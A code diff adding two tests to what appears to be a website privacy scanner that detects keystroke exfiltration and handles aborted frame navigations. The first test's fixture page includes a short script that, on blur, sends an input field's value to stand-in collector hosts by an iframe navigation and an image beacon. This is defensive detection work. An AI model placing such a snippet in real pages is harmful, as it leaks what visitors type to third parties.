@@ -5205,3 +5205,149 @@ test("the scanner blocks probe-triggered foreign-realm form navigation and auxil
     await new Promise<void>(resolve => upstream.close(() => resolve()));
   }
 });
+
+test("a child-frame navigation the input probe aborts leaves the request log and the probe's capture", { timeout: 30_000 }, async () => {
+  // Playwright's request event fires before the route callback, so the probe's
+  // navigation block used to find the request already in the recorder and in
+  // the probe's own capture. Aborting a child frame leaves the page on the
+  // subject, so the row survived: a third-party document that never loaded,
+  // and a keystroke detection naming a host that never received anything. The
+  // image beacon is the control: it really leaves, so it must stay a leak.
+  const paths: string[] = [];
+  const upstream = createServer((request, response) => {
+    paths.push(request.url ?? "");
+    response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+    response.end(`<!doctype html><title>Probe frame fixture</title>
+      <input id="field"><iframe id="frame" src="about:blank"></iframe>
+      <script>field.addEventListener('blur', () => {
+        frame.src = 'http://example.com/collect?v=' + encodeURIComponent(field.value);
+        new Image().src = 'http://example.net/beacon?v=' + encodeURIComponent(field.value);
+      });</script>`);
+  });
+  await new Promise<void>(resolve => upstream.listen(0, "127.0.0.1", resolve));
+  const address = upstream.address();
+  assert.ok(address && typeof address === "object");
+  try {
+    const { result, measurement } = await scanSiteWithMeasurement(
+      { url: "http://probe-frame.test/", device: "desktop", gpcEnabled: false, consentMode: "observe" },
+      { publicUrlAlreadyVerified: true, verifyPublicUrl: async () => undefined,
+        resolvePublicHost: async () => [{ address: "93.184.216.34", family: 4 }],
+        connectProxyUpstreamForTests: () => connect(address.port, "127.0.0.1"), resolveCnameChain: async () => [] }
+    );
+    assert.ok(measurement);
+    assert.ok(paths.some(path => path.startsWith("/beacon")), "the control beacon must have left");
+    assert.ok(paths.every(path => !path.startsWith("/collect")), "the aborted frame navigation must never reach the network");
+    const activePhase = measurement.measurement.phases.find(phase => phase.kind === "active-probe");
+    assert.ok(activePhase);
+    assert.ok(measurement.measurement.qualityFacts.captureLoss.some(loss =>
+      loss.family === "requests" && loss.kind === "dropped" && loss.phaseId === activePhase.phaseId
+    ));
+    assert.deepEqual(result.requests.filter(request => request.domain === "example.com"), []);
+    assert.deepEqual(measurement.evidence.requests.filter(request => request.domain === "example.com"), []);
+    const keystroke = result.fingerprintDetections?.find(detection => detection.kind === "keystroke-exfiltration");
+    assert.ok(keystroke && keystroke.kind === "keystroke-exfiltration");
+    assert.deepEqual(keystroke.evidence.recipients, ["example.net"]);
+    assert.ok(result.warnings.every(warning => !warning.includes("left the recorded site before or during the active input probe")));
+  } finally {
+    await closeSharedBrowserForTests();
+    await new Promise<void>(resolve => upstream.close(() => resolve()));
+  }
+});
+
+test("the probe's capture skips the navigations its route aborts and keeps everything else", async () => {
+  // The page route aborts a navigation's first hop while the probe runs, and
+  // never sees a redirect hop (Playwright routes only the first URL), so the
+  // capture must skip exactly the first hops: a hop the route never saw was
+  // sent and stays evidence.
+  const listeners = new Set<(request: unknown) => void>();
+  const emit = (request: unknown) => {
+    for (const listener of listeners) listener(request);
+  };
+  const handle = {
+    async isVisible() {
+      return true;
+    },
+    async evaluate<Arg>(callback: (element: HTMLElement, arg: Arg) => unknown, arg: Arg) {
+      const element = {
+        tagName: "INPUT",
+        isContentEditable: false,
+        getAttribute: () => "text",
+        blur: () => true
+      } as unknown as HTMLElement;
+      Object.defineProperty(globalThis, "probe-navigation-collector", {
+        configurable: true,
+        value: {
+          fieldType: () => "text",
+          focusForProbe: () => true,
+          sentinelPresent: () => true,
+          blur: () => true
+        }
+      });
+      try {
+        return callback(element, arg);
+      } finally {
+        Reflect.deleteProperty(globalThis, "probe-navigation-collector");
+      }
+    },
+    async focus() {},
+    async type(value: string) {
+      emit({
+        url: () => `https://nav-collector.example/frame?q=${value}`,
+        postData: () => null,
+        isNavigationRequest: () => true,
+        redirectedFrom: () => null
+      });
+      emit({
+        url: () => `https://hop-collector.example/landing?q=${value}`,
+        postData: () => null,
+        isNavigationRequest: () => true,
+        redirectedFrom: () => ({ url: () => "https://www.example.com/earlier" })
+      });
+      emit({
+        url: () => `https://beacon.example/collect?v=${value}`,
+        postData: () => null,
+        isNavigationRequest: () => false,
+        redirectedFrom: () => null
+      });
+    },
+    async dispose() {}
+  };
+  const page = {
+    url: () => "https://www.example.com/form",
+    on: (_event: string, listener: (request: unknown) => void) => {
+      listeners.add(listener);
+    },
+    off: (_event: string, listener: (request: unknown) => void) => {
+      listeners.delete(listener);
+    },
+    async waitForTimeout() {},
+    locator: () => ({
+      count: async () => 1,
+      nth: () => ({
+        async elementHandle() {
+          return handle;
+        }
+      })
+    })
+  };
+  const lifecycle: KeystrokeProbeLifecycle = {
+    cancelled: false,
+    typedFieldCount: 0,
+    stopCapture: () => undefined
+  };
+
+  const outcome = await probeKeystrokeExfiltration(
+    page as unknown as Parameters<typeof probeKeystrokeExfiltration>[0],
+    "https://www.example.com/form",
+    "www.example.com",
+    Date.now(),
+    new ScanWarningCollector(),
+    "probe-navigation-collector",
+    lifecycle
+  );
+
+  assert.equal(outcome.status, "complete");
+  assert.ok(outcome.detection && outcome.detection.kind === "keystroke-exfiltration");
+  assert.deepEqual(outcome.detection.evidence.recipients, ["beacon.example", "hop-collector.example"]);
+  assert.equal(listeners.size, 0, "the probe must retire its request listener");
+});
